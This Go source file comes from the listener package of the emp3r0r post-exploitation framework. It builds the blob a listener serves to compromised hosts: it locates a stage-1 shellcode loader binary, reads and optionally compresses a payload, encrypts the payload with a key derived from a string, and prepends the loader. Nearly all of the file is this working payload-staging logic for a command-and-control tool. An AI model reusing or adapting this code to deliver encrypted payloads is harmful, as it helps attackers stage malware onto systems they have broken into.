package listener

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

const stage1LoaderEnv = "EMP3R0R_STAGE1_LOADER"

func resolveStage1LoaderPath() string {
	if p := os.Getenv(stage1LoaderEnv); p != "" {
		return p
	}

	candidates := []string{
		"modules/shellcode_stager/loader.bin",
		"core/modules/shellcode_stager/loader.bin",
	}

	for _, p := range candidates {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}

	if cwd, err := os.Getwd(); err == nil {
		for _, rel := range candidates {
			p := filepath.Join(cwd, rel)
			if _, err := os.Stat(p); err == nil {
				return p
			}
		}
	}

	return ""
}

func buildServedBlob(payloadPath string, keyStr string, compression bool) ([]byte, error) {
	payload, err := os.ReadFile(payloadPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload file: %v", err)
	}

	key := deriveKeyFromString(keyStr)
	var toEncrypt []byte
	if compression {
		toEncrypt = compressData(payload)
	} else {
		toEncrypt = payload
	}
	encryptedPayload := encryptData(toEncrypt, key)

	loaderPath := resolveStage1LoaderPath()
	if loaderPath == "" {
		return encryptedPayload, nil
	}

	loader, err := os.ReadFile(loaderPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read stage1 loader (%s): %v", loaderPath, err)
	}

	blob := make([]byte, 0, len(loader)+len(encryptedPayload))
	blob = append(blob, loader...)
	blob = append(blob, encryptedPayload...)
	logging.Infof("Serving staged blob: loader=%d bytes payload=%d bytes total=%d bytes",
		len(loader), len(encryptedPayload), len(blob))
	return blob, nil
}
